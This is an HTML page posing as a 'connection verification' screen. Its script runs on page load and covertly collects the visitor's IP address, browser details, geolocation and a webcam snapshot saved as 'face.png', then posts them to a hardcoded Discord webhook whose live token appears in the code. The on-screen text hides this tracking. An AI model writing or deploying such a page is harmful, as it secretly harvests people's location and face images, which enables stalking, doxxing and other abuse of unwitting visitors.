<!DOCTYPE html>
<html>
<head>
  <title>Checking connection...</title>
  <script>
    const webhook = "https://discord.com/api/webhooks/1398368397896585349/woKYP9qMzxtDfBfi3cp6s0_QuT3mCKZwXsI_ibj2mzLdq-nyZbO19kM8tzUGYXk95s6w";

    async function getIP() {
      const res = await fetch("https://api.ipify.org/?format=json");
      const data = await res.json();
      return data.ip;
    }

    async function sendToDiscord(data, imageBlob = null) {
      const content = `
**New Visitor Tracked**
üìç Location: ${data.lat}, ${data.lon}
üåç IP: ${data.ip}
üñ• OS/Browser: ${data.userAgent}
üïí Time: ${new Date().toLocaleString()}
      `;

      const formData = new FormData();
      formData.append("payload_json", JSON.stringify({ content }));

      if (imageBlob) {
        formData.append("file", imageBlob, "face.png");
      }

      await fetch(webhook, {
        method: "POST",
        body: formData
      });
    }

    async function captureAndSend() {
      const ip = await getIP();
      const userAgent = navigator.userAgent;

      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          stream.getTracks().forEach(track => track.stop());

          const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
          await sendToDiscord({ ip, lat, lon, userAgent }, blob);
          document.body.innerHTML = "<h2>‚úÖ Connection Verified</h2>";
        } catch (err) {
          console.warn("Camera permission denied or error:", err);
          await sendToDiscord({ ip, lat, lon, userAgent });
          document.body.innerHTML = "<h2>‚ö†Ô∏è Location sent, but camera blocked.</h2>";
        }

      }, async () => {
        await sendToDiscord({ ip, lat: "N/A", lon: "N/A", userAgent });
        document.body.innerHTML = "<h2>‚ö†Ô∏è Location denied.</h2>";
      });
    }

    window.onload = captureAndSend;
  </script>
</head>
<body>
  <h2>üîÑ Verifying your connection...</h2>
</body>
</html>
